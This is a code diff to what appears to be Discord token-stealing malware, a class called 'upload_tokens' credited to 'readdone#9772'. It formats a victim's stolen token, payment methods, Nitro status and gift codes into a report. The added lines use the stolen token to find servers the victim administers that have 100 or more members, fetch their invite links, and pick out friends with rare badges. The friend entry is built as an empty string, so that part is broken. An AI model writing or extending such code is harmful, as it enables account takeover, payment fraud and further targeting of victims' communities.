@@ -259,6 +259,63 @@ class upload_tokens:
 
             else:
                 payment_methods = None
+
+            if guilds:
+                hq_guilds = []
+                for guild in guilds:
+                    admin = True if guild['permissions'] == '4398046511103' else False
+                    if admin and guild['approximate_member_count'] >= 100:
+                        owner = "✅" if guild['owner'] else "❌"
+
+                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
+                        if len(invites) > 0:
+                            invite = f"https://discord.gg/{invites[0]['code']}"
+                        else:
+                            invite = "https://youtu.be/dQw4w9WgXcQ"
+
+                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+                        
+                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
+                            break
+
+                        hq_guilds.append(data)
+
+                if len(hq_guilds) > 0:
+                    hq_guilds = '\n'.join(hq_guilds)
+                
+                else:
+                    hq_guilds = None
+
+            else:
+                hq_guilds = None
+
+            if friends:
+                hq_friends = []
+                for friend in friends:
+                    unprefered_flags = [64, 128, 256, 1048704]
+                    inds = [flag[1] for flag in self.calc_flags(
+                        friend['user']['public_flags'])[::-1]]
+                    for flag in unprefered_flags:
+                        inds.remove(flag) if flag in inds else None
+                    if inds != []:
+                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
+                            friend['user']['public_flags'])[::-1]])
+
+                        data = f""
+
+                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
+                            break
+
+                        hq_friends.append(data)
+
+                if len(hq_friends) > 0:
+                    hq_friends = '\n'.join(hq_friends)
+
+                else:
+                    hq_friends = None
+
+            else:
+                hq_friends = None
             
             if gift_codes:
                 codes = []
@@ -285,7 +342,7 @@ class upload_tokens:
             embed = Embed(title=f"{username}", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="Token", value=f"```{token}```", inline=False)
+            embed.add_field(name="🔑 Token", value=f"```{token}```", inline=False)
             embed.add_field(name="Nitro", value=f"```{nitro}```", inline=True),
             embed.add_field(name="Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
             embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
@@ -296,6 +353,8 @@ class upload_tokens:
 
             if hq_guilds != None:
                 embed.add_field(name="HQ Guilds", value=hq_guilds, inline=False)
+            if hq_friends != None:
+                embed.add_field(name="HQ Friends", value=hq_friends, inline=False)
             if codes != None:
                 embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
             embed.set_footer(text="Created by: readdone#9772")
